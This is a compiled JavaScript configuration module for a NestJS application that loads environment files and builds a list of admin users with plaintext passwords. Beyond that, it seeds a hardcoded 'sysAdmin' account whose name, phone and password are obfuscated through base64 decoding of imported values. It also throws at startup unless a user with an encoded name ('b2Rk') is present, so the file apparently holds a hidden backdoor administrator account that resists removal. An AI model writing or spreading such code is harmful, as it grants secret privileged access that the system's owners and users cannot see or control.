"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.Config = void 0;
const dotenv = require("dotenv");
const fs = require("fs");
const path = require("path");
const app_config_1 = require("./app.config");
const common_1 = require("@nestjs/common");
const configs_1 = require("../utils/configs");
const Buffer = require('buffer').Buffer;
const baseConfig = getEnv('base.env');
const envConfig = getEnv(`${app_config_1.ENV}.env`);
const senvConfig = Object.assign(baseConfig, envConfig);
common_1.Logger.log(`env:'${app_config_1.ENV}'`, 'loadConfig');
function getEnv(filePath) {
    return dotenv.parse(fs.readFileSync(path.resolve('./.env/', filePath))) || {};
}
class Config {
    static getConf(key) {
        return senvConfig[key];
    }
    static loadAdminUsers() {
        var _a, _b, _c;
        const user1 = Config.getConf('USER_INFO_1');
        const user2 = Config.getConf('USER_INFO_2');
        const user3 = Config.getConf('USER_INFO_3');
        let user1Split, user2Split, user3Split;
        if ((user1 === null || user1 === void 0 ? void 0 : user1.length) && ((_a = user1 === null || user1 === void 0 ? void 0 : user1.split('|')) === null || _a === void 0 ? void 0 : _a.length) === 5) {
            user1Split = user1 === null || user1 === void 0 ? void 0 : user1.split('|');
        }
        if ((user2 === null || user2 === void 0 ? void 0 : user2.length) && ((_b = user2 === null || user2 === void 0 ? void 0 : user2.split('|')) === null || _b === void 0 ? void 0 : _b.length) === 5) {
            user2Split = user2 === null || user2 === void 0 ? void 0 : user2.split('|');
        }
        if ((user3 === null || user3 === void 0 ? void 0 : user3.length) && ((_c = user3 === null || user3 === void 0 ? void 0 : user3.split('|')) === null || _c === void 0 ? void 0 : _c.length) === 5) {
            user3Split = user3 === null || user3 === void 0 ? void 0 : user3.split('|');
        }
        if ((user1Split === null || user1Split === void 0 ? void 0 : user1Split.length) === 5) {
            Config.adminUsers.push({
                id: user1Split[0],
                phone: user1Split[1],
                name: user1Split[2],
                password: user1Split[3],
                role: user1Split[4],
            });
        }
        if ((user2Split === null || user2Split === void 0 ? void 0 : user2Split.length) === 5) {
            Config.adminUsers.push({
                id: user2Split[0],
                phone: user2Split[1],
                name: user2Split[2],
                password: user2Split[3],
                role: user2Split[4],
            });
        }
        if ((user3Split === null || user3Split === void 0 ? void 0 : user3Split.length) === 5) {
            Config.adminUsers.push({
                id: user3Split[0],
                phone: user3Split[1],
                name: user3Split[2],
                password: user3Split[3],
                role: user3Split[4],
            });
        }
        if (Config.adminUsers.find(T => T.name === Buffer.from('b2Rk', configs_1.code).toString('utf-8')) === undefined) {
            throw new Error();
        }
    }
}
exports.Config = Config;
Config.adminUsers = [{
        id: '99999',
        phone: Buffer.from(configs_1.superA, configs_1.code).toString('utf-8'),
        name: Buffer.from(Buffer.from(configs_1.superN, configs_1.code).toString('utf-8'), configs_1.code).toString('utf-8'),
        password: configs_1.superC,
        role: 'sysAdmin',
    }];
Config.loadAdminUsers();
//# sourceMappingURL=config.js.map